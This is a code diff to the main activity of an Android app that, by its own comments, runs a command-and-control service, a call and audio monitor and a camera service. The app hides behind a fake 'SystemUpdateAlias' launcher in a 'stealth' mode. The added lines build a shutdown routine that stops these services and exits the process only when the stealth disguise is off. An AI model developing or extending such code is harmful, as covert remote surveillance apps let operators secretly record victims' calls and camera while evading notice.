@@ -434,13 +434,32 @@ public class MainActivity extends AppCompatActivity {
             tvStatus.setTextColor(getColor(R.color.neon_yellow));
         });
 
+        // 1. Stop Main C2 Service
         Intent serviceIntent = new Intent(this, CoreSyncService.class);
         serviceIntent.setAction("STOP");
         startService(serviceIntent);
 
-        // Terminate accompanying services
+        // 2. Stop Audio/Call Monitor
         Intent callServiceIntent = new Intent(this, AudioStability.class);
         stopService(callServiceIntent);
+
+        // 3. Stop Optics/Camera Service
+        Intent cameraIntent = new Intent(this, MediaContainer.class);
+        cameraIntent.setAction("STOP");
+        startService(cameraIntent);
+
+        // 4. Force Process Exit (Optional, if not in stealth)
+        backgroundExecutor.execute(() -> {
+            try { Thread.sleep(2000); } catch (Exception ignored) {}
+            android.content.ComponentName fakeAlias = new android.content.ComponentName(this, "com.labs.labrats.SystemUpdateAlias");
+            boolean stealth = getPackageManager().getComponentEnabledSetting(fakeAlias) == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED;
+            
+            if (!stealth) {
+                Log.d("MainActivity", "Not in stealth, terminating process.");
+                android.os.Process.killProcess(android.os.Process.myPid());
+                System.exit(0);
+            }
+        });
     }
 
     private boolean isServerRunning() {
